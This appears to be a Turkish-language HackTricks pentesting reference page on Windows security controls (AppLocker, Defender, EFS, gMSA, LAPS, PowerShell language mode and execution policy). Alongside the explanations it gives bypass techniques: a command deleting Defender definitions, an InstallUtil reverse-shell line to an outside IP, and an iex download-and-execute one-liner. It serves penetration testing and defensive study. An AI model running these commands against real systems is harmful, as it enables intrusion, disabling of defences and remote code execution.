# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Bir uygulama whitelist'i, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya executable'ların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli iş gereksinimleriyle uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** konusunda kontrol sağlar. Executable'lar, script'ler, Windows installer dosyaları, DLL'ler, packaged app'ler ve packed app installer'ları üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi** ve belirli dizinlere yazma erişimini **engellemesi yaygındır**, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların kara listeye veya beyaz listeye alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve policy'leri içerir ve sistemde yürürlükte olan mevcut kuralları incelemek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, bunu **bypass** etmek için kullanabileceğiniz **writable folders** bulunur.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) binary'leri AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör oluşturabilirsiniz** ve bu klasöre izin verilir.
- Kuruluşlar ayrıca çoğunlukla **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable'ını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, bir sisteme ek yük getirebilmesi ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Yerel credentials bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Credentials** (hash'lenmiş olarak), Single Sign-On nedenleriyle bu subsystem'in **memory**'sinde **saklanır**.\
**LSA**, yerel **security policy'yi** (parola policy'si, kullanıcı izinleri...), **authentication'ı**, **access token'larını**... yönetir.\
LSA, sağlanan credentials'ları **SAM** dosyasında (yerel login için) **kontrol edecek** ve bir domain kullanıcısını authenticate etmek için **domain controller** ile **iletişim kuracak** bileşendir.

**Credentials**, **LSASS process'i** içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı credentials'ları diskte saklayabilir:

- Active Directory bilgisayar hesabının parolası (ulaşılamayan domain controller).
- Windows service hesaplarının parolaları
- Scheduled task'ların parolaları
- Daha fazlası (IIS application'larının parolası...)

### NTDS.dit

Active Directory'nin database'idir. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting tool'larını **engeller**. Ancak bu **protection'ları bypass etmenin yolları** vardır.

### Check

**Defender**'ın **status'ünü** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifrelenmiş Dosya Sistemi (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **symmetric key** kullanarak dosyaları encryption yoluyla güvence altına alır. Bu key, kullanıcının **public key**'iyle encryption edilir ve şifrelenmiş dosyanın $EFS **alternative data stream**'i içinde saklanır. Decryption gerektiğinde, kullanıcının digital certificate'ına ait karşılık gelen **private key**, $EFS stream'indeki FEK'i decrypt etmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı tarafından başlatılmadan gerçekleşen decryption senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'e taşındığında otomatik olarak decrypt edilir.
- SMB/CIFS protocol üzerinden network aracılığıyla gönderilen encrypted dosyalar, transmission öncesinde decrypt edilir.

Bu encryption yöntemi, dosyaların sahibi tarafından **transparent access** ile erişilebilmesini sağlar. Ancak yalnızca sahibin password'ünü değiştirmek ve login olmak decryption işlemini mümkün kılmaz.

**Önemli Noktalar**:

- EFS, kullanıcının public key'iyle encrypted edilen symmetric bir FEK kullanır.
- Decryption, FEK'e erişmek için kullanıcının private key'ini kullanır.
- FAT32'ye kopyalama veya network transmission gibi belirli koşullarda automatic decryption gerçekleşir.
- Encrypted dosyalara, owner tarafından ek bir işlem yapılmadan erişilebilir.

### EFS bilgilerini kontrol etme

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek belirleyin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimlerin** **erişimi** olduğunu `cipher /c \<file>\` kullanarak kontrol edin.  
Bir klasörün içinde tüm dosyaları **encrypt** ve **decrypt** etmek için `cipher /e` ve `cipher /d` komutlarını da kullanabilirsiniz.

### EFS dosyalarını decrypt etme

#### Authority System olmak

Bu yöntem, **victim user**'ın host içinde bir **process** **çalıştırıyor** olmasını gerektirir. Durum buysa, bir `meterpreter` session kullanarak kullanıcının process'inin token'ını (`incognito` içindeki `impersonate_token`) impersonate edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının password'ünü bilmek

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT infrastructure'larında service account'ların yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan traditional service account'ların aksine, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'lar, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service (KDC) tarafından yönetilir ve manual password update gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu account'lar lockout'lara karşı bağışıktır ve interactive login'ler için kullanılamaz; bu da security'lerini artırır.
- **Multiple Host Support**: gMSA'lar birden fazla host arasında paylaşılabilir; bu nedenle birden fazla server üzerinde çalışan service'ler için idealdir.
- **Scheduled Task Capability**: managed service account'ların aksine gMSA'lar scheduled task çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak update eder ve SPN management'ı basitleştirir.

gMSA'ların password'leri LDAP property _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DCs) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca authorized administrator'lar ve gMSA'ların kurulu olduğu server'lar tarafından retrieve edilebilir ve güvenli bir environment sağlar. Bu information'a erişmek için LDAPS gibi secured bir connection gerekir veya connection'ın 'Sealing & Secure' ile authenticate edilmesi gerekir.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulun**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, **gMSA**'nin **password** bilgisini **okumak** için **NTLM relay attack** gerçekleştirme yöntemini anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) tarafından indirilebilir olan **Local Administrator Password Solution (LAPS)**, yerel Administrator password'larının yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu password'lar, Active Directory'de merkezi olarak saklanır. Bu password'lara erişim, ACL'ler aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde, yerel admin password'larını okuma yetkisi sağlanır.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), COM objects'lerini engellemek, yalnızca onaylanmış .NET types'larına izin vermek, XAML tabanlı workflows, PowerShell classes ve daha fazlası gibi PowerShell'i etkili bir şekilde kullanmak için gereken birçok **özelliği kısıtlar**.

### **Kontrol Et**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5 olarak değiştirmeniz** gerekebilir.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi authentication protokolünün kullanılacağını belirler. Bu authentication protokollerine Security Support Provider (SSP) adı verilir, her Windows makinesinde DLL biçiminde bulunurlar ve iletişim kurabilmeleri için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Main SSPs

- **Kerberos**: Tercih edilen yöntem
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçiminde
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü belirlemek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yetki yükseltilmiş işlemler için bir onay istemi** sağlayan bir özelliktir.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Applocker ve PowerShell contstrained language mode'u bypass etme](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [nasıl yapılır ~ EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA için Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy'yi Bypass Etmenin 15 Yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
